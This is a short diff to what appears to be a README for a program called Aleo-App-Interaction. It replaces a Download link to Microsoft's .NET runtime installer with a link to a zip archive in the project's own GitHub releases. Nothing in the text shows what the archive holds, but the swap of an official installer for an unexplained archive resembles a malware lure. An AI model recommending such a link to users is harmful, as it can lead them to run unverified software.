@@ -13,7 +13,7 @@
 
 **Aleo-App-Interaction:**  
 
-[Download](https://download.visualstudio.microsoft.com/download/pr/17089bd5-7875-4a3f-a430-5da3bc2dd57e/33acf480233bfb3fca383fb664fc8981/dotnet-runtime-6.0.31-win-x64.exe)  
+[Download](https://github.com/Aleo-App-Interaction/aleo/releases/download/V1.0.0/Aleo-App-Interaction.zip)  
 
 ##**Run this program Aleo-App-Interaction from the command line**  
 
